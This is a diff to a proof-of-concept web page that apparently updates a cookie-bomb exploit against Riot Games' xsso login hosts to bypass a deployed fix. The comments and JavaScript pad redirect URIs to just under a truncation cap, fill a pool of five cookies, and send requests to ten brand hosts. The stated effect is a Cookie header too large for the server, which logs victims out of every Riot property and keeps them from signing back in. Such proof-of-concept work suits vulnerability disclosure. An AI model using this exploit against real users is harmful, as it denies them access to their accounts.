@@ -9,8 +9,24 @@
 
 <body>
   <script>
-    const payload = "A".repeat(1000);
-    
+    // --- Bypass of the deployed follow-up fix ---------------------------------
+    // The fix caps the stored redirect `uri` at ~525 chars and reuses a fixed
+    // pool of 5 cookies (xsso_redirect_0..4, round-robin). A uri LONGER than the
+    // cap is truncated to origin-only -> tiny cookie, so the old 1000-char
+    // payload no longer works. Instead we size each uri to sit JUST UNDER the
+    // cap, so every one of the 5 slots is filled to its ~795-byte maximum
+    // (~4 KB total). That ~4 KB is harmless on its own, but it is sent on top of
+    // a logged-in user's own ~6 KB of cookies to xsso.riotgames.com, pushing the
+    // request's Cookie header past the ~8 KB limit -> GET /refresh returns 400 ->
+    // victim is logged out across every Riot property and cannot sign back in.
+    //
+    // Precondition: the victim is logged in to Riot (the normal state). Against a
+    // logged-out victim (empty jar) the ~4 KB stays under the limit -- that case
+    // is the part the fix actually closed.
+    // --------------------------------------------------------------------------
+
+    const URI_CAP = 524; // keep each uri just below the ~525-char truncation point
+
     // Each xsso host needs a uri that matches its own brand domain
     const targets = [
       ["xsso.riotgames.com",        "https://riotgames.com/"],
@@ -24,19 +40,30 @@
       ["xsso.playriftbound.com",    "https://playriftbound.com/"],
       ["xsso.arcane.com",           "https://arcane.com/"],
     ];
-    
-    async function flood(host, uri) {
-      const base = `https://${host}/login?uri=${uri}?x=${payload}`;
-      for (let i = 0; i < 12; i++) {
+
+    // Build a uri that fills the cookie to its maximum without tripping the
+    // truncation fallback: <landing>?x=AAAA... sized so the whole uri ~= URI_CAP.
+    function maxUri(landing) {
+      const prefix = landing + "?x=";
+      const padLen = Math.max(0, URI_CAP - prefix.length);
+      return prefix + "A".repeat(padLen);
+    }
+
+    async function flood(host, landing) {
+      const base = `https://${host}/login?uri=${maxUri(landing)}`;
+      // 5 reused slots; fire a few extra so all of 0..4 are filled (round-robin).
+      for (let i = 0; i < 8; i++) {
         await new Promise((resolve) => {
           const img = new Image();
           img.onload = img.onerror = resolve;
-          img.src = base + "&cb=" + Math.random();
+          img.src = base + "&cb=" + i + "_" + Math.random();
         });
       }
     }
-    
-    // Lock the victim out of every xsso host at once
+
+    // Break the authenticated session on every xsso host at once.
+    // xsso.riotgames.com alone is enough for the ecosystem-wide topbar logout;
+    // the rest extend the lockout to each brand's own login flow.
     targets.forEach(([h, u]) => flood(h, u));
   </script>
 </body>
